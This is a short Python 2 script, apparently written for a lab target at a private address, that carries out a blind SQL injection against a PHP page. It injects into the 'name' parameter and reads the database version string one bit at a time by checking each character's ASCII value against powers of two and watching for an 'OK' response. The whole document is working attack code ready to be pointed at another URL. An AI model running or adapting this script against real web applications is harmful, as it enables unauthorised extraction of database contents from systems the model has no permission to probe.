import httplib
import re

server = "10.10.220.221:8000"
path = "/blind-sqli.php"
sql = "SELECT+@@version"
string = ""
for i in range(30):
	c = 0#lol
	for j in range(7):
		inj = '\'%20and%20ascii(substring((' + sql + '),' + str(i) + ',1))%26' + str(2**j) + '%3d' + str(2**j)
		req = path + '?name=admin' + inj + '%20--%20'
		print req
		conn = httplib.HTTPConnection(server)
		conn.request("GET", req, "")
		status = conn.getresponse()
		response_body = status.read()

		if re.match('OK$', response_body, re.MULTILINE):
			print 'ok'
			c += 2**j
			
		print response_body
	string += chr(c)

print string

		
